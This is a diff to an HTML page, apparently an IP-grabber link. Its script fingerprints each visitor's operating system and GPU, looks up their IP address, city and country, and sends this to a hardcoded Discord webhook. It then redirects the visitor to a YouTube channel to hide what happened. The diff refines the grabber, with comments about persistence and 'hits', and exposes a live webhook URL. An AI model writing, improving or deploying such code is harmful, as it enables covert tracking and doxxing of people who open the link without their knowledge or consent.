@@ -5,42 +5,49 @@
     const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
     const y = "https://youtube.com/@LigmaBlox-w7m";
 
-    // The mandatory Discord bypass wrapper
+    // Standardized Discord delivery system
     const send = (msg) => navigator.sendBeacon(h, new Blob([JSON.stringify({content: msg})], {type: 'application/json'}));
 
-    async function gD() {
+    async function getSpecs() {
+        // Gets a clean OS name and attempts to isolate the GPU from the ANGLE engine
+        let ua = navigator.userAgent;
+        let os = ua.match(/\(([^)]+)\)/)[1].split(';')[0]; 
         try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const d = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop().split(" (")[0];
-        } catch(e) { return navigator.platform; }
+            let gl = document.createElement('canvas').getContext('webgl');
+            let gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+            if (gpu.includes("ANGLE")) gpu = gpu.split(", ").pop();
+            return `${os} (${gpu})`;
+        } catch(e) { return os; }
     }
 
-    async function run() {
-        const v = sessionStorage.getItem('v');
+    async function execute() {
+        const isRe = sessionStorage.getItem('v');
         sessionStorage.setItem('v', '1');
-        const dev = await gD();
+        const specs = await getSpecs();
+        const start = Date.now();
 
-        // 1. Instant Hardware Ping
-        send(`[${v ? "RE-ENTRY" : "NEW HIT"}]\nDev: ${dev}`);
-
-        // 2. The 2ms Brute-Force Loop for City/IP
-        while(true) {
+        while (true) {
             try {
-                const r = await fetch('https://ip-api.com/json/?cb=' + Date.now()).then(res => res.json());
-                if(r.status === "success") {
-                    send(`IP: ${r.query}\nCity: ${r.city}\nISP: ${r.isp}`);
+                const res = await fetch('https://ip-api.com/json/?cb=' + Date.now());
+                const r = await res.json();
+
+                if (r.status === 'success') {
+                    const data = `[${isRe ? "RE-ENTRY" : "NEW HIT"}]\nModel: ${specs}\nIP: ${r.query}\nLoc: ${r.city}, ${r.country}`;
+                    send(data);
                     break;
                 }
-            } catch(e) {
+            } catch (e) {
+                // 2ms loop for maximum persistence
                 await new Promise(s => setTimeout(s, 2));
             }
+
+            // Safety timeout: Redirect anyway after 1.5 seconds if network is blocked
+            if (Date.now() - start > 1500) break;
         }
-        
-        // 3. Clean Redirect
-        setTimeout(() => window.location.replace(y), 300);
+        window.location.replace(y);
     }
-    run();
+
+    execute();
 </script>
 </body>
 </html>
